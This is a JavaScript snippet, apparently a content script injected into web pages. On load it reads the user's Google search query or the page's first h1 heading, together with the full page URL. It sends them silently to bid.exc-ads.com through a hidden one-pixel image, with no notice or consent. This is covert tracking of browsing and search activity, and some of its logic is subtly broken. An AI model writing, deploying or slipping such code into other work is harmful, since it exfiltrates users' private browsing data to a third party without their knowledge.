


var lasth= "none-title-roxzzz!"
function getlock()
{
    if(lock('whitelist')) return;
	var t
	try{
		var hall;
		if(window.location.href.match('(http|https)://(www.)google.com(.vn)?/.*')!=null)
		{
			hall = getUrlVars()["q"]
			console.log(h);
		}else{
			hall = document.querySelectorAll("h1");
		}
		
		for (i = 0; i < hall.length; ++i) {
			var h= hall[i];
		
			if(h!= undefined ) {
				
				var na =h.textContent.trim().replace(/(\r\n|\n|\r)/gm,"");
	
				
				if(na.length<4) continue;
				if(lasth== na) return;
				
				lasth= na;
				
				
				
				var oImg=document.createElement("img");
				oImg.src= 'https://bid.exc-ads.com/aim.ashx?na='+encodeURI(na)+ '&u='+encodeURI(window.location.href);
				oImg.width = '1';
				oImg.height = '1';
				document.body.appendChild(oImg);
				break;
			}
		}
	}catch(e){}
	// logws();

}


getlock();
function gup( name, url ) {
  if (!url) url = location.href;
  name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
  var regexS = "[\\?&]"+name+"=([^&#]*)";
  var regex = new RegExp( regexS );
  var results = regex.exec( url );
  console.log(results);
  return results == null ? null : results[1];
}
function getUrlVars() {
    var vars = {};
    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi,    
    function(m,key,value) {
      vars[key] = value;
    });
    return vars;
  }
function getdomain(url) {
	if(url==null) return "";
    var domain;
    if (url.indexOf("://") > -1) {
        domain = url.split('/')[2];
    }
    else {
        domain = url.split('/')[0];
    }
    domain = domain.split(':')[0];
    return domain.replace('www.','');
}
function setCookie(cname, cvalue, addmins) {
    var d = new Date();
    d.setTime(d.getTime() + (addmins*60*1000));
    var expires = "expires="+d.toUTCString();
    document.cookie = cname + "=" + cvalue + "; " + expires;
}

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}
 

 
//makeRequest('https://api.ipify.org/');
 
function lock(key) {
    var html = document.querySelector('html'),
        dataKey = 'private-lock-' + key ,
        locked = html.getAttribute(dataKey);
    if (!locked) {
        html.setAttribute(dataKey, true);
    }
    return locked;
}


